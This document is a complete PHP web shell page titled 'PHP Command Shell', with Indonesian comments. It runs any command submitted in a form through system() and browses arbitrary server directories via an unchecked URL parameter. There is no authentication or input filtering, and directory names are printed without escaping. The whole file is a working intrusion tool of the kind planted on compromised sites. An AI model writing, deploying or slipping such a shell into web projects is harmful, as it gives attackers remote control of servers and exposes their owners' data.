<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PHP Command Shell</title>
</head>
<body>
    <h2>PHP Command Execution</h2>

    <?php
    // Dapatkan direktori dari parameter URL atau gunakan direktori saat ini
    $currentDir = isset($_GET['dir']) ? $_GET['dir'] : getcwd();
    
    // Pastikan currentDir adalah direktori yang valid
    if (!is_dir($currentDir)) {
        echo "<p>Invalid directory: $currentDir</p>";
        exit;
    }

    // Pindah ke direktori yang dipilih
    chdir($currentDir);

    // Menampilkan form untuk menjalankan perintah
    ?>
    <form method="POST">
        <label for="command">Enter Command:</label><br>
        <input type="text" name="command" id="command" placeholder="Type your command here">
        <input type="hidden" name="dir" value="<?php echo htmlspecialchars($currentDir); ?>">
        <input type="submit" value="Execute">
    </form>

    <?php
    // Eksekusi perintah jika ada input
    if ($_SERVER["REQUEST_METHOD"] === "POST" && isset($_POST['command'])) {
        $command = $_POST['command'];

        // Eksekusi perintah
        echo "<h3>Result:</h3>";
        echo "<pre>";
        system($command);
        echo "</pre>";
    }

    // Tampilkan current working directory
    echo "<h3>Current Directory:</h3>";
    echo "<p>$currentDir</p>";

    // Tampilkan isi direktori saat ini
    echo "<h3>Directory Contents:</h3>";
    echo "<pre>";
    $items = scandir($currentDir);
    
    foreach ($items as $item) {
        if ($item == '.' || $item == '..') {
            continue;
        }

        // Buat link jika item adalah direktori
        if (is_dir($item)) {
            $newDir = realpath($currentDir . DIRECTORY_SEPARATOR . $item);
            echo "<a href=\"?dir=" . urlencode($newDir) . "\">$item/</a><br>";
        } else {
            // Tampilkan nama file biasa
            echo "$item<br>";
        }
    }
    echo "</pre>";
    ?>
</body>
</html>
